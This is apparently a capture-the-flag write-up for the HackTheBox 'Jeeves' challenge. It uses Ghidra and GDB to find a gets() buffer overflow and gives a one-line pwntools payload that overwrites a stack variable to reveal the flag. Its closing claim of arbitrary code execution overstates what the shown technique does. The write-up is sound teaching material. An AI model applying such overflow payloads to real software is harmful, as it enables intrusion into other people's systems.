HackTheBox: Jeeves

Binary Exploitation Linux Medium Buffer Overflow

Binary Analysis with Ghidra

The binary was disassembled using Ghidra to understand the program's logic. The key finding: if a specific buffer value equals a certain constant, the program prints the contents of flag.txt.

The binary checks if a value at [rbp-0x4] equals 0x1337bab3. If true, it prints the flag.

GDB Reverse Engineering

Using GDB with GEF to analyze memory layout and identify the offset between input buffer and the target variable:

gef➤ disassemble main
Dump of assembler code for function main:
  0x00000000000011e9 <+0>:     endbr64
  0x00000000000011ed <+4>:     push   rbp
  0x00000000000011ee <+5>:     mov    rbp,rsp
  0x00000000000011f1 <+8>:     sub    rsp,0x40
  0x00000000000011f5 <+12>:    mov    DWORD PTR [rbp-0x4],0xdeadc0d3
  0x0000000000001211 <+40>:    lea    rax,[rbp-0x40]      # Input buffer
  0x0000000000001214 <+43>:    mov    rdi,rax
  0x0000000000001219 <+48>:    call   0x10d0     # Vulnerable!
  0x0000000000001236 <+77>:    cmp    DWORD PTR [rbp-0x4],0x1337bab3
  0x000000000000123d <+84>:    jne    0x12a8

The input is read using gets(), which is vulnerable to buffer overflow. The target variable is at [rbp-0x4].

Calculating the Offset

Using GDB to find memory addresses and calculate the exact offset:

gef➤ search-pattern ElliotAlderson
[+] In '[stack]'(0x7ffffffdd000-0x7ffffffff000)
 0x7fffffffda40 - 0x7fffffffda4e  →  "ElliotAlderson"

gef➤ search-pattern 0xdeadc0d3
[+] In '[stack]'(0x7ffffffdd000-0x7ffffffff000)
 0x7fffffffda7c - 0x7fffffffda8c  →  "\xd3\xc0\xad\xde"

Calculating the difference in Python:

┌─[elliot@parrot]─[~]
└──╼ $ python3
>>> 0x7fffffffda7c - 0x7fffffffda40
60

The offset between the input buffer and the target variable is 60 bytes.

Payload Crafting

Creating a test flag.txt for Proof of Concept:

┌─[elliot@parrot]─[~/Desktop/HTB]
└──╼ $ echo "htb{elliothacks}" > flag.txt

Crafting the exploit payload locally:

┌─[elliot@parrot]─[~/Desktop/HTB]
└──╼ $ python3 -c "import sys,pwn; sys.stdout.buffer.write((b'A'*60)+pwn.p64(0x1337bab3))" | ./jeeves

Key Takeaways

  • Buffer Overflow - Exploiting unsafe gets() function
  • Ghidra Analysis - Static analysis to understand program logic
  • GDB/ GEF - Dynamic analysis for memory offset calculation
  • pwntools - Python library for exploit development
  • Stack Layout - Understanding variable positions on the stack

This challenge demonstrates classic stack-based buffer overflow where controlling a specific stack variable leads to arbitrary code execution.
